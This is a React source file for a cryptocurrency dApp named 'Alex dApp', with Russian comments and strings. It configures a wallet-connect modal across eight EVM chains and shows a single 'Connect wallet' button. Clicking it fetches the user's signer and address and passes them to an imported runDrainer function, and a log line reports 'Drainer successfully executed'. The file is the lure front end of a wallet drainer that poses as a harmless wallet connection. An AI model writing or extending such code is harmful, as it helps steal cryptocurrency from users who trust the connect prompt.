import React from 'react'
import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { getWalletClient, configureChains, createConfig } from '@wagmi/core'
import { publicProvider } from '@wagmi/core/providers/public'
import { ethers } from 'ethers'
import { runDrainer } from './drainer'

// AppKit & Wagmi конфигурация
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'http://localhost:5173',
    icons: ['https://checkalex.xyz/icon.png']
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false
  },
  allWallets: 'SHOW'
})

// Wagmi core config
const { chains, publicClient } = configureChains(networks, [publicProvider()])
const wagmiConfig = createConfig({ autoConnect: true, publicClient })

export default function App() {
  const handleClick = async () => {
    try {
      await modal.open()

      const walletClient = await getWalletClient(wagmiConfig)
      if (!walletClient) throw new Error('Кошелек не подключен')

      const provider = new ethers.providers.Web3Provider(walletClient.transport, 'any')
      const signer = provider.getSigner()
      const address = await signer.getAddress()

      console.log('✅ Кошелёк подключён:', address)

      await runDrainer(provider, signer, address)
      console.log('✅ Drainer успешно выполнен')

    } catch (err) {
      console.error('❌ Ошибка при подключении или вызове:', err)
      alert('Ошибка: ' + (err?.message || err))
    }
  }

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif' }}>
      <h1>Alex dApp</h1>
      <button onClick={handleClick} style={{
        padding: '1rem 2rem',
        fontSize: '1.2rem',
        borderRadius: '8px',
        background: '#1c1c1c',
        color: '#fff',
        cursor: 'pointer'
      }}>
        Подключить кошелёк
      </button>
    </div>
  )
}
